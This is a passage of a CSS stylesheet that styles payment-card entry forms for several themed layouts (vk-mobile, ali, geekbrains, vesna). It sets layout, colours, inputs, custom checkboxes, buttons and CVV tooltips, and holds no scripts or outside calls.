}

.pay-card-layout__notification_type_vk-mobile .info-block_type_error .paragraph {
	margin: 0;
	font-size: 14px;
	line-height: 15px;
	letter-spacing: -.2px
}

.pay-card-layout__notification_type_vk-mobile .info-block_type_question {
	display: none;
	position: fixed;
	left: 0;
	top: 0;
	width: 100%;
	height: 100%;
	z-index: 100;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	color: #000
}

.pay-card-layout__notification_type_vk-mobile .info-block_type_question .info-block__content {
	position: fixed;
	left: 50%;
	top: 50%;
	width: 280px;
	margin: -85px 0 0 -140px;
	padding: 30px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	border-radius: 3px;
	background: #fff;
	text-align: center;
	-webkit-box-shadow: 0 0 40px 0 rgba(0, 0, 0, .3);
	box-shadow: 0 0 40px 0 rgba(0, 0, 0, .3);
	-webkit-user-select: none;
	-moz-user-select: none;
	user-select: none
}

.pay-card-layout__notification_type_vk-mobile .info-block_type_question .title {
	margin: 0 0 5px;
	font-size: 16px;
	line-height: -.3px;
	color: #222;
	font-weight: 700
}

.pay-card-layout__notification_type_vk-mobile .info-block_type_question .paragraph {
	margin: 0 0 20px;
	font-size: 14px;
	line-height: 18px;
	letter-spacing: -.2px;
	color: #030303
}

.pay-card-layout_type_vk-mobile .pay-card .control__select,
.pay-card-layout_type_vk-mobile .payment-form__label_type_amount .payment-form_input,
.pay-card_type_vk-mobile .credit-card-form__input {
	display: block;
	min-width: auto;
	width: 100%;
	height: 40px;
	padding: 0 10px;
	margin: 0 0 15px;
	font-family: SFUIText, arial, helvetica;
	font-size: 15px;
	border: 1px solid #cacfd4;
	border-radius: 3px;
	background: none;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	color: #000;
	letter-spacing: -.2px;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.pay-card-layout_type_vk-mobile .pay-card .control__select {
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none;
	position: relative;
	z-index: 10
}

.pay-card-layout_type_vk-mobile .pay-card__card-selector {
	position: relative
}

.pay-card-layout_type_vk-mobile .pay-card__card-selector .control-label__text:after,
.pay-card-layout_type_vk-mobile .pay-card__card-selector .control-label__text:before {
	position: absolute;
	top: 50%;
	content: "";
	width: 0;
	height: 0;
	margin-top: 4px
}

.pay-card-layout_type_vk-mobile .pay-card__card-selector .control-label__text:before {
	right: 8px;
	border-left: 6px solid transparent;
	border-right: 6px solid transparent;
	border-top: 6px solid #666
}

.pay-card-layout_type_vk-mobile .pay-card__card-selector .control-label__text:after {
	right: 9px;
	border-left: 5px solid transparent;
	border-right: 5px solid transparent;
	border-top: 5px solid #fff
}

.pay-card-layout_type_vk-mobile .payment-form__description {
	display: inline-block;
	width: 65%;
	vertical-align: middle
}

.pay-card-layout_type_vk-mobile .payment-form__label_type_amount {
	display: block;
	margin: 0;
	padding: 0;
	font-size: 16px;
	color: #000
}

.pay-card-layout_type_vk-mobile .payment-form__label_type_amount .payment-form_input {
	display: inline-block;
	width: 90px;
	margin-right: 10px
}

.pay-card-layout_type_vk-mobile .payment-form__label_error_yes .payment-form_input,
.pay-card_type_vk-mobile .credit-card-form__label_error_yes .credit-card-form__input {
	outline: 0;
	border-color: #d9aeae;
	background-color: #faeaea
}

.pay-card-layout_type_vk-mobile .pay-card-layout__promo,
.pay-card-layout_type_vk-mobile .pay-card-layout__promo-title-wrapper {
	margin: 0 0 15px
}

.pay-card-layout_type_vk-mobile .pay-card-layout__promo-title {
	font-size: 16px;
	line-height: 24px;
	color: #000
}

.pay-card-layout_type_vk-mobile .pay-card-layout__promo-columns {
	display: table;
	width: 100%;
	border: 1px solid #7491b3;
	border-radius: 4px;
	background: #ebf3fc
}

.pay-card-layout_type_vk-mobile .pay-card-layout__promo-column {
	display: table-cell
}

.pay-card-layout_type_vk-mobile .pay-card-layout__promo-column_type_left,
.pay-card-layout_type_vk-mobile .pay-card-layout__promo-column_type_right {
	padding: 10px;
	vertical-align: middle
}

.pay-card-layout_type_vk-mobile .pay-card-layout__promo-column_type_left {
	width: 1%
}

.pay-card-layout_type_vk-mobile .pay-card-layout__promo-column_type_right {
	width: 99%;
	padding-left: 0;
	font-size: 14px;
	color: #626972
}

.pay-card-layout_type_vk-mobile .credit-card-form__popup {
	z-index: 30
}

.pay-card-layout_type_vk-mobile-p2p .pay-card-layout__notification_type_vk-mobile .info-block_type_question .info-block__content {
	top: 100px;
	margin-top: 0
}

.pay-card-layout_type_vk-mobile_theme_ali .pay-card-layout__notification_type_vk-mobile .info-block_type_sum .info-block__content {
	background: transparent
}

.pay-card-layout_type_vk-mobile_theme_ali .pay-card-layout__notification_type_vk-mobile .info-block_type_sum .info-block__column_type_left {
	color: #000;
	line-height: 1.45;
	letter-spacing: -.2px
}

.pay-card-layout_type_vk-mobile_theme_ali .pay-card-layout__notification_type_vk-mobile .info-block_type_error {
	border-radius: 8px
}

.pay-card-layout_type_vk-mobile_theme_ali .pay-card-layout__notification_type_vk-mobile .info-block_type_sum .info-block__column_type_right,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card-layout__notification_type_vk-mobile .info-block_type_title .title {
	color: #000;
	font-size: 28px;
	line-height: 1.45;
	font-weight: 700
}

.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__popup .button {
	width: auto
}

.pay-card-layout_type_vk-mobile_theme_ali .pay-card-layout__notification_type_vk-mobile .info-block_type_question .button,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__popup .button,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__submit .button {
	color: #fff;
	border-radius: 8px;
	background: #ff4747
}

.pay-card-layout_type_vk-mobile_theme_ali .pay-card-layout__notification_type_vk-mobile .info-block_type_question .button:active,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card-layout__notification_type_vk-mobile .info-block_type_question .button:hover,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__popup .button:active,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__popup .button:hover,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__submit .button:active,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__submit .button:hover {
	background: #ff4747
}

.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__submit .button_disabled_yes,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__submit .button_disabled_yes:active,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__submit .button_disabled_yes:hover {
	color: #fff;
	background: #ff4747;
	opacity: .5
}

.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__submit .button b {
	font-weight: 500
}

.pay-card-layout_type_vk-mobile_theme_ali .pay-card-layout__notification_type_vk-mobile .info-block_type_question .button_theme_vk-light,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__popup .button_theme_vk-light,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__submit .button_theme_vk-light {
	color: #2b587a;
	border-radius: 0;
	text-shadow: none;
	background: transparent;
	letter-spacing: -.7px;
	color: #2e9cc3
}

.pay-card-layout_type_vk-mobile_theme_ali .pay-card-layout__notification_type_vk-mobile .info-block_type_question .button_theme_vk-light:active,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card-layout__notification_type_vk-mobile .info-block_type_question .button_theme_vk-light:hover,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__popup .button_theme_vk-light:active,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__popup .button_theme_vk-light:hover,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__submit .button_theme_vk-light:active,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__submit .button_theme_vk-light:hover {
	background: #e1e7ed
}

.pay-card-layout_type_vk-mobile_theme_ali .pay-card-layout__notification_type_vk-mobile .info-block_type_question .button_theme_vk-light,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card-layout__notification_type_vk-mobile .info-block_type_question .button_theme_vk-light:active,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card-layout__notification_type_vk-mobile .info-block_type_question .button_theme_vk-light:hover,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__popup .button_theme_vk-light,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__popup .button_theme_vk-light:active,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__popup .button_theme_vk-light:hover,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__submit .button_theme_vk-light,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__submit .button_theme_vk-light:active,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__submit .button_theme_vk-light:hover {
	text-shadow: none;
	background: transparent;
	border-radius: 8px
}

.pay-card-layout_type_vk-mobile_theme_ali.pay-card-layout_type_vk-mobile .payment-form__label .payment-form__title,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__label .credit-card-form__title,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .pay-card__select-card .control-label__text {
	color: #666;
	font-size: 14px
}

.pay-card-layout_type_vk-mobile_theme_ali.pay-card-layout_type_vk-mobile .pay-card .control__select,
.pay-card-layout_type_vk-mobile_theme_ali.pay-card-layout_type_vk-mobile .payment-form__label_type_amount .payment-form_input,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__input {
	border-radius: 8px;
	background: #f7f7f7;
	border-color: #dadada
}

.pay-card-layout_type_vk-mobile_theme_ali.pay-card-layout_type_vk-mobile .pay-card__card-selector .control-label__text:before {
	border-top-color: #999;
	z-index: 20
}

.pay-card-layout_type_vk-mobile_theme_ali.pay-card-layout_type_vk-mobile .pay-card__card-selector .control-label__text:after {
	z-index: 20;
	border-top-color: #f7f7f7
}

.pay-card-layout_type_vk-mobile_theme_ali.pay-card-layout_type_vk-mobile .pay-card .control__select {
	z-index: 1
}

.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__terms-link,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .pay-card__remove-card-text {
	color: #2e9cc3
}

.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__terms {
	color: #666
}

.pay-card-layout_type_vk-mobile_theme_ali.pay-card-layout_type_vk-mobile .secure-information,
.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__submit {
	border-top: 1px solid #f2f2f2
}

.pay-card-layout_type_vk-mobile_theme_ali .secure-information__text_type_protocol {
	color: #62b363
}

.pay-card-layout_type_vk-mobile_theme_ali.pay-card-layout_type_vk-mobile .secure-information__text {
	line-height: 1.29;
	letter-spacing: -.6px;
	color: #666
}

.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__label-group_type_add-card {
	margin: 10px 0 20px
}

.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile .credit-card-form__label-group_type_add-card .credit-card-form__label {
	width: 100%;
	padding-right: 20px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile [type=checkbox] {
	position: absolute;
	z-index: -1;
	opacity: 0
}

.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile [type=checkbox]:focus {
	outline: 0
}

.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile [type=checkbox]+.credit-card-form__input-icon {
	position: relative;
	cursor: pointer;
	background: transparent;
	border: none;
	float: right
}

.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile [type=checkbox]+.credit-card-form__input-icon:before {
	content: "";
	position: absolute;
	top: -4px;
	left: 0;
	width: 50px;
	height: 30px;
	border-radius: 16px;
	background: #dadada;
	-webkit-transition: .2s;
	-o-transition: .2s;
	transition: .2s
}

.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile [type=checkbox]+.credit-card-form__input-icon:after {
	content: "";
	position: absolute;
	top: -2px;
	left: 2px;
	width: 26px;
	height: 26px;
	border-radius: 14px;
	border: none;
	background: #fff;
	-webkit-transition: .2s;
	-o-transition: .2s;
	transition: .2s;
	-webkit-transform: none;
	-o-transform: none;
	transform: none
}

.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile [type=checkbox]:checked+.credit-card-form__input-icon {
	background: transparent;
	border: none
}

.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile [type=checkbox]:checked+.credit-card-form__input-icon:before {
	background: #ff4747
}

.pay-card-layout_type_vk-mobile_theme_ali .pay-card_type_vk-mobile [type=checkbox]:checked+.credit-card-form__input-icon:after {
	left: 22px
}

.pay-card-layout_type_geekbrains {
	min-height: 100%;
	min-width: 320px;
	padding: 0 16px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	background: #e9edf4;
	font: normal 16px/24px Roboto, arial, verdana, sans-serif
}

.pay-card-layout_type_geekbrains .pay-card-layout__columns {
	margin: 0 -16px 20px;
	padding: 0 16px 20px;
	border-bottom: 1px solid #e0e5ea
}

.pay-card-layout_type_geekbrains .pay-card-layout__column {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card-layout_type_geekbrains .pay-card-layout__column_type_left {
	float: left
}

.pay-card-layout_type_geekbrains .pay-card-layout__column_type_right {
	float: right
}

.pay-card-layout_type_geekbrains .pay-card-layout__sum,
.pay-card-layout_type_geekbrains .pay-card-layout__title {
	margin: 0;
	padding: 0;
	font-size: 24px;
	line-height: 32px;
	font-weight: 500;
	color: #4c5d6e
}

.pay-card-layout_type_geekbrains .notification-block .title {
	font-size: 24px;
	line-height: 32px;
	color: #4c5d6e
}

.pay-card-layout_type_geekbrains .notification-block .paragraph {
	font-size: 16px;
	line-height: 24px
}

.pay-card_type_geekbrains {
	text-align: left
}

.pay-card_type_geekbrains .pay-card__row {
	padding-top: 0
}

.pay-card_type_geekbrains .pay-card__title {
	margin: 0 0 17px;
	padding: 0;
	text-align: left;
	color: #4c5d6e
}

.pay-card_type_geekbrains .pay-card__card-selector {
	width: auto;
	margin: 0 0 17px
}

.pay-card_type_geekbrains .pay-card__card-selector.pay-card__card-selector_type_hidden {
	display: none!important
}

.pay-card_type_geekbrains .pay-card__select-card {
	display: block
}

.pay-card_type_geekbrains .control {
	margin-right: 0
}

.pay-card_type_geekbrains .control-label .control-label__text {
	display: block;
	margin: 0 0 3px;
	text-transform: none;
	font-size: 13px;
	line-height: 18px;
	color: #99a8b7
}

.pay-card_type_geekbrains .control-label .control__select {
	width: 100%!important;
	height: 40px;
	background: #fff;
	border-radius: 4px;
	font-size: 18px;
	line-height: 40px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card_type_geekbrains .pay-card__card {
	width: auto;
	margin: 0
}

.pay-card_type_geekbrains .credit-card-form__form {
	padding: 0;
	margin: 0
}

.pay-card_type_geekbrains .credit-card-form__card-wrapper {
	position: relative;
	margin: 0 0 -17px
}

.pay-card_type_geekbrains .credit-card-form__card_position_back,
.pay-card_type_geekbrains .credit-card-form__card_position_front {
	position: relative;
	margin: 0;
	padding: 0;
	width: auto;
	height: auto;
	float: none;
	-webkit-box-shadow: none;
	box-shadow: none;
	border-radius: 0;
	background: none
}

.pay-card_type_geekbrains .credit-card-form__card_position_front {
	position: relative
}

.pay-card_type_geekbrains .credit-card-form__card_position_back {
	position: relative;
	z-index: 2;
	width: 128px;
	margin: -78px 0 0 160px;
	display: inline-block;
	vertical-align: top;
	right: auto;
	line-height: 18px
}

.pay-card_type_geekbrains .credit-card-form__card_position_back:before {
	display: none
}

.pay-card_type_geekbrains .credit-card-form__label-group {
	margin: 0 0 17px;
	float: none
}

.pay-card_type_geekbrains .credit-card-form__label-group .credit-card-form__title {
	margin: 0 0 3px;
	text-transform: none;
	font-size: 13px;
	line-height: 18px;
	color: #99a8b7
}

.pay-card_type_geekbrains .credit-card-form__label-group_type_expiration-date {
	display: inline-block;
	width: 128px
}

.pay-card_type_geekbrains .credit-card-form__label-group_type_expiration-date .credit-card-form__input,
.pay-card_type_geekbrains .credit-card-form__label-group_type_expiration-date .credit-card-form__title {
	width: 100%;
	margin-left: 0
}

.pay-card_type_geekbrains .credit-card-form__label-group_type_cvv .credit-card-form__label {
	width: 100%;
	float: none;
	margin: 0;
	padding: 0;
	line-height: 20px;
	position: relative
}

.pay-card_type_geekbrains .credit-card-form__label_type_cvv {
	display: inline-block;
	width: 100%
}

.pay-card_type_geekbrains .credit-card-form__tooltip_type_cvv {
	width: 155px;
	background: #000;
	position: absolute;
	left: -8px;
	top: -45px;
	text-align: left;
	font-size: 12px;
	line-height: 14px;
	color: #fff
}

.pay-card_type_geekbrains .credit-card-form__tooltip-icon {
	display: none
}

.pay-card_type_geekbrains .credit-card-form__tooltip-arrow {
	right: auto;
	left: 50%;
	border-top-color: #000;
	border-width: 4px;
	margin-left: -2px
}

.pay-card_type_geekbrains .credit-card-form__error-text,
.pay-card_type_geekbrains .credit-card-form__title_type_expiration-date {
	display: none
}

.pay-card_type_geekbrains .credit-card-form__label-group_type_card-number {
	padding: 0
}

.pay-card_type_geekbrains .credit-card-form__input {
	height: 40px;
	padding: 0 12px;
	border: none;
	border-radius: 4px;
	color: #2c2d30;
	font-size: 18px;
	background: #fff;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.pay-card_type_geekbrains .credit-card-form__input:disabled {
	color: #99a8b7;
	opacity: 1;
	-webkit-text-fill-color: #99a8b7
}

.pay-card_type_geekbrains .credit-card-form__label_error_yes .credit-card-form__input {
	outline: 0;
	border: 1px solid #c94d4c
}

.pay-card_type_geekbrains .credit-card-form__label_error_yes .credit-card-form__title {
	color: #c94d4c
}

.pay-card_type_geekbrains .payment-systems-icons {
	position: absolute;
	right: 0;
	top: 110px
}

.pay-card_type_geekbrains .payment-systems-icon {
	margin-left: 25px
}

.pay-card_type_geekbrains .credit-card-form__terms {
	position: relative;
	padding: 0;
	margin: 20px 0 0;
	font-size: 13px;
	line-height: 18px;
	color: #99a8b7
}

.pay-card_type_geekbrains .credit-card-form__terms-link {
	color: #99a8b7;
	text-decoration: underline
}

.pay-card_type_geekbrains .credit-card-form__terms-link:hover {
	text-decoration: none
}

.pay-card_type_geekbrains .credit-card-form__cvv-icon {
	position: relative;
	right: auto;
	top: -1px;
	display: inline-block;
	background: none
}

.pay-card_type_geekbrains .credit-card-form__cvv-icon:before,
.pay-card_type_geekbrains .credit-card-form__select-card-icon:before {
	display: inline-block;
	content: "[?]";
	cursor: help
}

.pay-card_type_geekbrains .credit-card-form__popup .button,
.pay-card_type_geekbrains .credit-card-form__submit .button {
	color: #fff;
	border-radius: 4px;
	background: #4db6ac;
	font-size: 16px;
	font-weight: 400;
	outline: none;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.pay-card_type_geekbrains .credit-card-form__popup .button:active,
.pay-card_type_geekbrains .credit-card-form__popup .button:hover,
.pay-card_type_geekbrains .credit-card-form__submit .button:active,
.pay-card_type_geekbrains .credit-card-form__submit .button:hover {
	background: #59bbb2
}

.pay-card_type_geekbrains .credit-card-form__submit {
	padding-right: 58px;
	margin-top: 0
}

.pay-card_type_geekbrains .credit-card-form__submit .button {
	width: 100%;
	margin-right: 58px
}

.pay-card_type_geekbrains .credit-card-form__submit .button__light {
	position: relative;
	width: 40px;
	float: right;
	margin: -40px -58px 0 0;
	padding: 0 10px;
	text-align: center;
	font-size: 20px;
	background: #ccd4dc
}

.pay-card_type_geekbrains .credit-card-form__submit .button__light:hover {
	background: #d6dce3
}

.pay-card_type_geekbrains .credit-card-form__popup-footer {
	position: relative;
	z-index: 10
}

.pay-card-layout_type_geekbrains .credit-card-form__popup,
.pay-card-layout_type_geekbrains .notification-block,
.pay-card_type_geekbrains .credit-card-form__popup,
.pay-card_type_geekbrains .notification-block {
	background: #e9edf4
}

.pay-card_type_geekbrains .notification-block .notification-block__inner {
	padding: 25px
}

.pay-card_type_geekbrains .notification-block .payment-info-table,
.pay-card_type_geekbrains .notification-block .payment-info-table__caption {
	background: #fff
}

.pay-card_type_geekbrains .notification-block .payment-info-table {
	position: relative;
	display: block;
	margin: 0 10px 30px;
	padding: 20px
}

.pay-card_type_geekbrains .notification-block .payment-info-table:before {
	position: absolute;
	left: -10px;
	right: -10px;
	top: -4px;
	z-index: 1;
	height: 8px;
	background: #4c5d6e;
	content: "";
	border-radius: 6px;
	border: 2px solid #99a8b7;
	font-size: 0;
	line-height: 0;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card_type_geekbrains .notification-block .payment-info-table:after {
	position: absolute;
	left: 0;
	right: 0;
	bottom: -1px;
	z-index: 1;
	height: 0;
	border-bottom: 1px dashed #fff;
	content: "";
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card_type_geekbrains .notification-block .payment-info-table__caption {
	position: relative;
	z-index: 2;
	display: block;
	margin: -20px -20px 10px;
	padding: 20px 20px 0;
	font-size: 18px;
	line-height: 24px;
	color: #4c5d6e;
	text-align: left;
	background: #fff
}

.pay-card_type_geekbrains .notification-block .payment-info-table__head {
	padding-left: 0;
	padding-bottom: 0;
	font-size: 13px;
	line-height: 24px;
	color: #2c2d30;
	text-align: left
}

.pay-card_type_geekbrains .notification-block .payment-info-table__cell {
	padding-right: 0;
	padding-bottom: 0;
	font-size: 13px;
	line-height: 24px;
	color: #2c2d30
}

.pay-card_type_geekbrains .notification-block .grid-table__row:last-child .payment-info-table__cell,
.pay-card_type_geekbrains .notification-block .grid-table__row:last-child .payment-info-table__head {
	padding-bottom: 0
}

.pay-card_type_geekbrains .notification-block .paragraph_color_red {
	color: #c94d4c
}

.pay-card_type_geekbrains .notification-block .button {
	padding-left: 60px;
	padding-right: 60px
}

.pay-card_type_geekbrains .notification-block_status_ok .button {
	display: block;
	margin: 0;
	width: 100%;
	background: #177bbb
}

.pay-card_type_geekbrains .notification-block_status_ok .button:hover {
	background: #005f9b
}

.pay-card_type_geekbrains .control-label .control__select {
	border: 1px solid transparent
}

.pay-card-layout_type_geekbrains.pay-card-layout_type_geekbrains_cart .credit-card-form__submit {
	padding-right: 0
}

.pay-card-layout_type_geekbrains.pay-card-layout_type_geekbrains_cart .credit-card-form__submit .button {
	color: #fff;
	border-radius: 4px;
	background: #00cf8f;
	margin-right: 0
}

.pay-card-layout_type_geekbrains.pay-card-layout_type_geekbrains_cart .credit-card-form__submit .button:active,
.pay-card-layout_type_geekbrains.pay-card-layout_type_geekbrains_cart .credit-card-form__submit .button:hover {
	background: #00cf8f
}

.pay-card-layout_type_geekbrains.pay-card-layout_type_geekbrains_cart .credit-card-form__popup .button {
	color: #fff;
	border-radius: 4px;
	background: #00cf8f
}

.pay-card-layout_type_geekbrains.pay-card-layout_type_geekbrains_cart .credit-card-form__popup .button:active,
.pay-card-layout_type_geekbrains.pay-card-layout_type_geekbrains_cart .credit-card-form__popup .button:hover {
	background: #00cf8f
}

@media screen and (max-width:580px) {
	.pay-card_type_geekbrains .credit-card-form__card_position_front {
		margin-bottom: 50px
	}
	.pay-card_type_geekbrains .credit-card-form__card_position_back {
		margin-top: -128px
	}
	.pay-card_type_geekbrains .credit-card-form__tooltip_type_cvv {
		left: 130px
	}
	.pay-card_type_geekbrains .credit-card-form__tooltip-arrow {
		left: 104px
	}
	.pay-card_type_geekbrains .payment-systems-icons {
		right: auto;
		left: 0;
		top: 165px
	}
	.pay-card_type_geekbrains .payment-systems-icon {
		margin-left: 0;
		margin-right: 25px
	}
}

.control__select_type_geekbrains {
	width: 100%!important
}

.pay-card-layout_type_geekbrains .credit-card-form__submit .button,
.pay-card-layout_type_geekbrains .pay-card-layout__sum {
	font-family: Roboto, Arial, sans-serif
}

.pay-card_type_vesna {
	position: relative;
	width: 100%;
	max-width: 360px;
	margin: 0 auto;
	padding: 5px 15px 15px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	font-size: 14px;
	line-height: 19px;
	-webkit-font-smoothing: antialiased
}

.pay-card_type_vesna .pay-card__card-selector {
	width: auto
}

.pay-card_type_vesna .pay-card__select-card {
	display: block
}

.pay-card_type_vesna .pay-card__select-card .control {
	margin-right: 0
}

.pay-card_type_vesna .pay-card__select-card .control__select {
	width: 100%;
	height: 40px;
	padding: 4px;
	margin: 0 0 10px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	border-radius: 0;
	background: #fff;
	font-size: 16px
}

.pay-card_type_vesna .pay-card__remove-card {
	display: inline-block;
	margin: 0 0 5px;
	color: rgba(0, 0, 0, .54);
	line-height: 18px
}

.pay-card_type_vesna .pay-card__remove-card-icon {
	padding-right: 5px
}

.pay-card_type_vesna .pay-card__card {
	width: auto
}

.pay-card_type_vesna .pay-card__card_type_added-card .credit-card-form__label-group_type_add-card {
	display: none
}

.pay-card_type_vesna .pay-card__message {
	text-align: left
}

.pay-card_type_vesna .credit-card-form__card-wrapper {
	position: relative
}

.pay-card_type_vesna .credit-card-form__form {
	padding: 0;
	text-align: left
}

.pay-card_type_vesna .credit-card-form__card_position_front {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	width: auto;
	height: 212px;
	margin: 0 auto 10px;
	padding: 20px;
	background: #ededed;
	border-radius: 12px;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_vesna .payment-systems-icons {
	top: 0;
	margin: 0 0 10px;
	float: left
}

.pay-card_type_vesna .payment-systems-icon {
	float: right;
	margin: 0 10px 0 0
}

.pay-card_type_vesna .credit-card-form__label-group_type_card-number {
	clear: both;
	margin: 0 0 10px
}

.pay-card_type_vesna .credit-card-form__title {
	margin: 0 0 5px;
	text-transform: none;
	font-size: 14px;
	color: #262626
}

.pay-card_type_vesna .credit-card-form__input {
	height: 40px;
	background: #fff;
	border-color: #ccc;
	border-radius: 4px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none
}

.pay-card_type_vesna .credit-card-form__label-group_type_add-card .credit-card-form__label {
	font-size: 14px
}

.pay-card_type_vesna .credit-card-form__label-group_type_add-card .credit-card-form__input {
	display: none
}

.pay-card_type_vesna [type=checkbox]+.credit-card-form__input-icon {
	display: inline-block;
	margin-right: 10px;
	vertical-align: top;
	width: 14px;
	height: 14px;
	border: 2px solid #767676;
	border-radius: 2px
}

.pay-card_type_vesna [type=checkbox]:checked+.credit-card-form__input-icon {
	background: #ff5f56;
	border-color: #ff5f56
}

.pay-card_type_vesna [type=checkbox]:checked+.credit-card-form__input-icon:after {
	content: "";
	display: block;
	margin: auto;
	width: 5px;
	height: 10px;
	border: solid #fff;
	border-width: 0 2px 2px 0;
	-webkit-transform: rotate(45deg);
	-o-transform: rotate(45deg);
	transform: rotate(45deg)
}

.pay-card_type_vesna .credit-card-form__title_type_expiration-date,
.pay-card_type_vesna .pay-card__select-card .control-label__text {
	display: none
}

.pay-card_type_vesna .credit-card-form__label-group_type_expiration-date {
	margin: 0
}

.pay-card_type_vesna .credit-card-form__label-group_type_expiration-date .credit-card-form__input,
.pay-card_type_vesna .credit-card-form__label-group_type_expiration-date .credit-card-form__title {
	margin-left: 0;
	width: 90px
}

.pay-card_type_vesna .credit-card-form__label-group_type_add-card {
	margin: 0 0 10px
}

.pay-card_type_vesna .credit-card-form__label_type_cvv {
	margin: 0 0 0 40px;
	width: 60px
}

.pay-card_type_vesna .credit-card-form__cvv-icon,
.pay-card_type_vesna .credit-card-form__cvv-icon:hover,
.pay-card_type_vesna .credit-card-form__label_type_cvv:hover .credit-card-form__cvv-icon {
	height: 20px;
	width: 20px
}

.pay-card_type_vesna .credit-card-form__cvv-icon {
	position: relative;
	display: inline-block;
	top: 35px;
	left: 10px;
	border-radius: 10px;
	background-image: none;
	background-color: #999;
	text-align: center;
	color: #fff;
	cursor: pointer
}

.pay-card_type_vesna .credit-card-form__cvv-icon:hover {
	background-color: #ff5f56
}

.pay-card_type_vesna .credit-card-form__cvv-icon:before {
	display: inline-block;
	content: "?";
	font-weight: 700;
	font-size: 15px
}

.pay-card_type_vesna .credit-card-form__terms {
	font-size: 14px;
	line-height: 19px;
	color: rgba(0, 0, 0, .54)
}

.pay-card_type_vesna .credit-card-form__terms-link {
	color: #ff5f56
}

.pay-card_type_vesna .credit-card-form__error-text {
	left: 20px;
	color: #fff;
	background: #000;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	padding: 10px 15px;
	font-size: 14px;
	margin-top: 10px;
	z-index: 1
}

.pay-card_type_vesna .credit-card-form__error-text:before {
	position: absolute;
	top: -20px;
	left: 10px;
	border: solid transparent;
	content: "";
	height: 0;
	width: 0;
	pointer-events: none;
	border-bottom-color: #000;
	border-width: 10px
}

